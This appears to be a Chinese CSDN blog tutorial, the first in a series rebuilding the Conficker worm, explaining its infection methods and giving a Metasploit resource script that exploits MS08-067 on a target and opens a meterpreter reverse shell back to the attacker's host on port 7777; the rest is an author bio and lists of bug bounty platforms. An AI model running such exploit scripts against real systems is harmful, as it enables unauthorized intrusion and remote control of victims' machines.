# 原创
：  【Python脚本进阶】2.4、conficker蠕虫（上）:Metasploit攻击Windows SMB服务

# 【Python脚本进阶】2.4、conficker蠕虫（上）:Metasploit攻击Windows SMB服务

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）Metasploit攻击Windows SMB服务（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|conficker蠕虫博文|目标|状态
|[【Python脚本进阶】conficker蠕虫（上）:Metasploit攻击Windows SMB服务](https://blog.csdn.net/qq_53079406/article/details/126077115)|Metasploit攻击|已发布
|[【Python脚本进阶】conficker蠕虫（中）:Python脚本与Metasploit交互](https://blog.csdn.net/qq_53079406/article/details/126081487)|Python脚本与Metasploit交互|已发布
|[【Python脚本进阶】conficker蠕虫（下）:暴破口令，远程执行进程](https://blog.csdn.net/qq_53079406/article/details/126084405)|暴破口令，远程执行进程|已发布
|[【Python脚本进阶】conficker蠕虫（终）](https://blog.csdn.net/qq_53079406/article/details/126084602)|完整代码|已发布
</tbody></table>



---


**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、分析：](#1.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[二、Metasploit攻击Windows SMB服务](#%E4%BA%8C%E3%80%81Metasploit%E6%94%BB%E5%87%BBWindows%20SMB%E6%9C%8D%E5%8A%A1)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.2、示例：](#2.2%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

---


## 一、简介

> 
<h3>1.1、分析：</h3>
在其基本的感染方法中， Conficker蠕虫使用了两种不同的攻击方法。
1、利用了Windows服务器中一个服务的Oday漏洞。利用这个栈溢出漏洞， 蠕虫能在被感染的主机上执行shellcode并下载蠕虫。
2、Conficker蠕虫暴力破解默认的管理员网络共享(ADMN$）的口令以获取肉机访问权。


---


---


## 二、Metasploit攻击Windows SMB服务

> 
<h3>2.1、分析：</h3>
利用Metasploit框架（http://metasploit.com/download/）简化攻击代码。作为一个开源计算机安全项目，很快就被广泛使用， 并且已经变成了一个漏洞利用代码的开发工具包。
<hr/>
Metasploit能让渗透测试人员在标准化和脚本化的环境中运行数以千计的不同的计算机漏洞利用代码。在Con.ticker蠕虫中使用的漏洞曝光后不久， HDMoore就将一个有效的漏洞利用代码整合进了框架内—-MS08-067 _netapi


> 
<h3>2.2、示例：</h3>
虽然攻击者可以通过交互驱动的方式使用Metasploit, 但Metasploit也能读取批处理脚本(re)完成攻击。在攻击时，Metasploit会顺序执行批处理文件中的命令。
<hr/>
如使用ms08 _ 067 netapi (Conficker)攻击“ 肉机” (192.168.x.x)， 使之与我们自己的主机192.168.xx.xx的7777端口建立一个反向shell

<pre><code>use exploit/windows/smb/ms08_ 067_netapi
set RHOST 192.168.x.x
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.xx.xx
set LPORT 7777
exploit -j -z</code></pre>
使用Metasploit进行攻击时， 先选好要用的漏洞利用代码(exploit/windows/smb/ms08 _ 067 _ netapi)
选定目标，目标设置为192.168.1.37
设定负载为windows/meterpreter/reverse _ tcp
将反向连接的目标设为主机192.168.77.77, 端口为7777
最后Metasploit去实施攻击。
<hr/>
将上面这些代码保存为文件conficker.rc。只要输入命令msfconsole -r conficker.rc, 就能发起攻击。这条命令让Metasploit运行脚本conficker.rc中的指令。如果攻击成功， 会返回一个让我们能控制目标计算机的Windows 命令行shell。



---


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

